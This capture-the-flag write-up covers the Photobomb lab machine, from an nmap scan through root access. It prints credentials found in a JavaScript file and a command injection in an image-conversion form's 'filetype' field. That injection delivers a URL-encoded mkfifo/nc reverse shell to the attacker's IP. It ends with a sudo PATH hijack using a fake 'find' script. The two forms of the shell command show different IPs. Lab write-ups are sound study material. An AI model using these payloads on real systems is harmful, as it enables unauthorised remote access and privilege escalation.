# NMAP

The scan shows that photobomb has 80 and 22 open 

```{sh}
$ nmap 10.129.93.24 -sC -sV -p22,80

Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-02 15:01 CET
Nmap scan report for 10.129.93.24
Host is up (0.073s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.91 seconds

```

# WEB PAGE 

the webpage has the following directories

not able to read them 

/source_images
/resized_images

## default 

The webpage has the following information:
<ol>
    <li>its a printing service</li>
    <li>credentials for printing are given to users in a welcome pack </li>
    <li>technichal support team is on  4 4283 77468377</li>
</ol>

when trying to access the link in the description we get a login alert. Looking at the js code that the webpage loads we can see that the credentials are in plain text in the js code 

```{sh}
$ curl http://photobomb.htb/photobomb.js

function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

>pH0t0:b0Mb!

## /printer

in the next web page that loads, we have a form with the names: name (image to select), filetype (type of file to submit), dimensions (the dimensions of printing)

notes:
the sever blacklists (in photo) any form of / or .. 
it also blocks it in the dimensions
it does not in the filetype 
it seems to only have the jpg images and then convert them into png if asked

I am, for now, unable to find an arbitrary file read in the image selector.

playing around with it i broke it and it returned me an error web-page, with some information:

the server is running on ruby using sinatra
some images are in images are in resized_images

## foothold 

after being a long time with the application trying to see if there was anything missing i became aware of something, if i malformed the filename parameter gave me this back:

```{http}
filetype=png;

Failed to generate a copy of wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg
```

Maybie, just maybie, the machine was using an os command to transform the jpg image into a png one, after tampering with it:>

```{http}
filetype=png;+sleep+1000

504 Gateway Time-out
```

Now we only have to give it a reverse shell and i will have user access to the computer: after doing a very small script to transform a string to an url encoded string we have the following shell command:

```{sh}
$ echo ";rm pipe1; mkfifo pipe1; /bin/sh -i 2>&1 0<pipe1 | nc 10.10.14.93 2020 1>pipe1" | python3 url_encoder.py 
%3Brm%20pipe1%3B%20mkfifo%20pipe1%3B%20/bin/sh%20-i%202%3E%261%200%3Cpipe1%20%7C%20nc%2010.10.14.72%202020%201%3Epipe1
```

we just give this to filetype and we are done :)

No further configuration details of Nginx confirm the existance of another server.

# System anaysis

## Checking for suid

the first step was to see if there where any suid files that we could take advantage of:

```{sh}
$ find / -perm -u=s -type f 2>/dev/null 1> output
$ ls -l $(cat output)
-rwsr-sr-x 1 daemon daemon      55560 Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root   root        85064 Mar 14  2022 /usr/bin/chfn
-rwsr-xr-x 1 root   root        53040 Mar 14  2022 /usr/bin/chsh
-rwsr-xr-x 1 root   root        39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root   root        88464 Mar 14  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root        55528 Feb  7  2022 /usr/bin/mount
-rwsr-xr-x 1 root   root        44784 Mar 14  2022 /usr/bin/newgrp
-rwsr-xr-x 1 root   root        68208 Mar 14  2022 /usr/bin/passwd
-rwsr-xr-x 1 root   root        67816 Feb  7  2022 /usr/bin/su
-rwsr-xr-x 1 root   root       166056 Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root   root        39144 Feb  7  2022 /usr/bin/umount
-rwsr-xr-- 1 root   messagebus  51344 Apr 29  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root       473576 Mar 30  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root        22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
```

i tried taking advantage of mount but requiered to be root to "copy" the root directory

next step was to see if anyting interestin was executing

```{sh}
$ ps -l -u 0 | grep -Ev "kworker|irq|scsi"

F S   UID     PID    PPID  C PRI  NI ADDR SZ WCHAN  TTY          TIME CMD
4 S     0       1       0  0  80   0 - 25548 -      ?        00:00:02 systemd
1 S     0       2       0  0  80   0 -     0 -      ?        00:00:00 kthreadd
1 I     0       3       2  0  60 -20 -     0 -      ?        00:00:00 rcu_gp
1 I     0       4       2  0  60 -20 -     0 -      ?        00:00:00 rcu_par_gp
1 I     0       9       2  0  60 -20 -     0 -      ?        00:00:00 mm_percpu_wq
1 I     0      11       2  0  80   0 -     0 -      ?        00:00:09 rcu_sched
1 S     0      12       2  0 -40   - -     0 -      ?        00:00:00 migration/0
5 S     0      13       2  0   9   - -     0 -      ?        00:00:00 idle_inject/0
1 S     0      15       2  0  80   0 -     0 -      ?        00:00:00 cpuhp/0
1 S     0      16       2  0  80   0 -     0 -      ?        00:00:00 cpuhp/1
5 S     0      17       2  0   9   - -     0 -      ?        00:00:00 idle_inject/1
1 S     0      18       2  0 -40   - -     0 -      ?        00:00:00 migration/1
5 S     0      22       2  0  80   0 -     0 -      ?        00:00:00 kdevtmpfs
1 I     0      23       2  0  60 -20 -     0 -      ?        00:00:00 netns
1 S     0      24       2  0  80   0 -     0 -      ?        00:00:00 rcu_tasks_kthre
1 S     0      25       2  0  80   0 -     0 -      ?        00:00:00 kauditd
1 S     0      27       2  0  80   0 -     0 -      ?        00:00:00 khungtaskd
1 S     0      28       2  0  80   0 -     0 -      ?        00:00:00 oom_reaper
1 I     0      29       2  0  60 -20 -     0 -      ?        00:00:00 writeback
1 S     0      30       2  0  80   0 -     0 -      ?        00:00:00 kcompactd0
1 S     0      31       2  0  85   5 -     0 -      ?        00:00:00 ksmd
1 S     0      32       2  0  99  19 -     0 -      ?        00:00:00 khugepaged
1 I     0      79       2  0  60 -20 -     0 -      ?        00:00:00 kintegrityd
1 I     0      80       2  0  60 -20 -     0 -      ?        00:00:00 kblockd
1 I     0      81       2  0  60 -20 -     0 -      ?        00:00:00 blkcg_punt_bio
1 I     0      82       2  0  60 -20 -     0 -      ?        00:00:00 tpm_dev_wq
1 I     0      83       2  0  60 -20 -     0 -      ?        00:00:00 ata_sff
1 I     0      84       2  0  60 -20 -     0 -      ?        00:00:00 md
1 I     0      85       2  0  60 -20 -     0 -      ?        00:00:00 edac-poller
1 I     0      86       2  0  60 -20 -     0 -      ?        00:00:00 devfreq_wq
1 S     0      87       2  0 -40   - -     0 -      ?        00:00:00 watchdogd
1 S     0      90       2  0  80   0 -     0 -      ?        00:00:00 kswapd0
1 S     0      91       2  0  80   0 -     0 -      ?        00:00:00 ecryptfs-kthrea
1 I     0      93       2  0  60 -20 -     0 -      ?        00:00:00 kthrotld
1 I     0     126       2  0  60 -20 -     0 -      ?        00:00:00 acpi_thermal_pm
1 I     0     135       2  0  60 -20 -     0 -      ?        00:00:00 ipv6_addrconf
1 I     0     144       2  0  60 -20 -     0 -      ?        00:00:00 kstrp
1 I     0     160       2  0  60 -20 -     0 -      ?        00:00:00 charger_manager
1 I     0     201       2  0  60 -20 -     0 -      ?        00:00:00 cryptd
1 I     0     210       2  0  60 -20 -     0 -      ?        00:00:00 mpt_poll_0
1 I     0     213       2  0  60 -20 -     0 -      ?        00:00:00 mpt/0
1 I     0     299       2  0  60 -20 -     0 -      ?        00:00:00 ttm_swap
1 I     0     358       2  0  60 -20 -     0 -      ?        00:00:00 raid5wq
1 S     0     409       2  0  80   0 -     0 -      ?        00:00:00 jbd2/sda2-8
1 I     0     410       2  0  60 -20 -     0 -      ?        00:00:00 ext4-rsv-conver
4 S     0     464       1  0  79  -1 - 17134 -      ?        00:00:00 systemd-journal
1 I     0     487       2  0  60 -20 -     0 -      ?        00:00:00 ipmi-msghandler
4 S     0     498       1  0  80   0 -  5662 -      ?        00:00:00 systemd-udevd
1 I     0     554       2  0  60 -20 -     0 -      ?        00:00:00 nfit
1 I     0     620       2  0  60 -20 -     0 -      ?        00:00:00 kaluad
1 I     0     621       2  0  60 -20 -     0 -      ?        00:00:00 kmpath_rdacd
1 I     0     622       2  0  60 -20 -     0 -      ?        00:00:00 kmpathd
1 I     0     623       2  0  60 -20 -     0 -      ?        00:00:00 kmpath_handlerd
4 S     0     624       1  0 -40   - - 53650 -      ?        00:00:02 multipathd
4 S     0     663       1  0  80   0 - 11885 -      ?        00:00:00 VGAuthService
4 S     0     673       1  0  80   0 - 77878 -      ?        00:00:27 vmtoolsd
5 S     0     675       1  0  80   0 - 24974 -      ?        00:00:00 dhclient
4 S     0     685       1  0  80   0 - 59824 -      ?        00:00:00 accounts-daemon
4 S     0     694       1  0  80   0 -  7423 -      ?        00:00:00 networkd-dispat
4 S     0     701       1  0  80   0 - 59078 -      ?        00:00:00 polkitd
4 S     0     708       1  0  80   0 -  4282 -      ?        00:00:00 systemd-logind
4 S     0     709       1  0  80   0 - 98848 -      ?        00:00:00 udisksd
4 S     0     778       1  0  80   0 - 79706 -      ?        00:00:00 ModemManager
4 S     0     866       1  0  80   0 -  1704 -      ?        00:00:00 cron
4 S     0     882       1  0  80   0 -  3044 -      ?        00:00:00 sshd
1 S     0     884       1  0  80   0 - 13819 -      ?        00:00:00 nginx
4 S     0     887       1  0  80   0 -  1457 -      tty1     00:00:00 agetty
```

Items found that could be leveraged:

<ol>
  <li>cron is active and running</li>
  <li>someone is using a terminal, so it is probable we can hijack his session, so becoming tty group could be beneficious</li>
  <li>the ssh service is running</li>
</ol>

## Execution flow hijacking 

After visiting this website for ideas, https://steflan-security.com/linux-privilege-escalation-checklist and testing many of them, i came across this:

```{sh}
$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh

```

We are allowed to use sudo without a password and change the environmental variables into the program /opt/cleanup.sh, opening this file:

```{sh}
$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

one very simple thing to do is change the path for the find command, adding a shell into a file called find, and we will be root :)

```{sh}
$ echo "#!/bin/bash" > find
$ echo "bash" >> find
$ cat find
#!/bin/bash
bash
$ chmod +x find
$ $ sudo PATH=/tmp:$PATH /opt/cleanup.sh
/bin/sh: 31: $: not found
$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
ls /root
root.txt
cat /root/root.txt
```

And we have the root file and this machine is over :).
